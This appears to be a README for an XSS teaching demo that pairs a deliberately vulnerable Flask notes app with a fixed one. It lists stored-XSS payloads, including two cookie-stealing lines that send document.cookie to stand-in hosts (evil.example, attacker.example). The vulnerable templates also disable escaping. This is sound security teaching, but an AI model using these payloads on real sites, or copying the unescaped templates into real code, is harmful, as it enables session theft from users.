# Contextual Output Encoding and XSS

## What Is It?

Cross-Site Scripting (XSS) occurs when untrusted data is included in a web
page without being encoded for the context in which it appears. Even if the
data is validated on input, rendering it unsafely allows an attacker to inject
HTML or JavaScript that executes in other users' browsers.

The key insight is that **the same data requires different escaping in different output contexts**:

| Context | Safe encoding | Example — raw: `<script>alert(1)</script>` |
|---|---|---|
| HTML body | HTML entities | `&lt;script&gt;alert(1)&lt;/script&gt;` |
| HTML attribute | Attribute encoding | `&lt;script&gt;alert&#40;1&#41;&lt;/script&gt;` |
| JavaScript string | JSON encoding | `"\u003cscript\u003ealert(1)\u003c/script\u003e"` |
| URL parameter | URL encoding | `%3Cscript%3Ealert%281%29%3C%2Fscript%3E` |

Applying HTML entity encoding to a JavaScript string (or vice versa) provides
**no protection** — the contexts require different escaping rules.

### Why Stored XSS Is Especially Dangerous

With stored (persistent) XSS:
1. Attacker posts a note containing `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>`
2. The script is stored on the server.
3. Every subsequent user who views the notes page has the script execute in their browser.
4. Session cookies, tokens, and CSRF state are sent to the attacker's server.

## The Demo

| File | Purpose |
|---|---|
| `vulnerable/app.py` | Flask notes board — stores and renders notes without sanitisation |
| `vulnerable/templates/index.html` | Uses `\| safe` (disables auto-escaping) and raw `{{ }}` in JS |
| `fixed/app.py` | Same application logic — template change provides the fix |
| `fixed/templates/index.html` | Removes `\| safe`; uses `\| tojson` for JS context |

## How to Run

### Prerequisites

```bash
pip install flask
```

---

### Vulnerable Version

```bash
cd vulnerable
python app.py
# Open http://127.0.0.1:5000 in your browser
```

**HTML context XSS — submit this as a note:**

```
<script>alert('XSS via HTML context — stored!')</script>
```

The page reloads and the alert fires. Every subsequent visitor also sees the alert.

**JavaScript context XSS — submit this as a note:**

```
'; alert('XSS via JS context'); var x='
```

The rendered `<script>` block becomes:

```javascript
var lastNote = ''; alert('XSS via JS context'); var x='';
```

The injected code runs between the two legitimate variable assignments.

**Session hijack simulation (realistic impact) — submit:**

```
<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">
```

---

### Fixed Version

```bash
cd fixed
python app.py
# Open http://127.0.0.1:5000 in your browser
```

**Same HTML context payload — now rendered as harmless text:**

```
<script>alert('XSS via HTML context — stored!')</script>
```

The page displays the literal text `<script>alert(...)` — no alert fires.

Inspect the page source to confirm Jinja2's encoding:

```html
&lt;script&gt;alert(&#39;XSS via HTML context — stored!&#39;)&lt;/script&gt;
```

**Same JavaScript context payload — string boundary intact:**

```
'; alert('XSS via JS context'); var x='
```

Rendered source:

```javascript
var lastNote = "'; alert('XSS via JS context'); var x='";
```

The payload is safely inside a JSON string literal. No code executes.

## Key Fixes

| Issue | Vulnerable | Fixed |
|---|---|---|
| HTML context | `{{ note \| safe }}` — auto-escaping disabled | `{{ note }}` — Jinja2 auto-escaping active (default for .html) |
| JavaScript context | `'{{ notes[-1] }}'` — raw interpolation into JS string | `{{ notes[-1] \| tojson }}` — proper JSON encoding; includes quotes |
| XSS payload | `<script>alert(1)</script>` executes | Rendered as `&lt;script&gt;alert(1)&lt;/script&gt;` — visible text |
| JS injection | `'` closes the string; arbitrary code runs | All special characters JSON-escaped; string boundary cannot be broken |
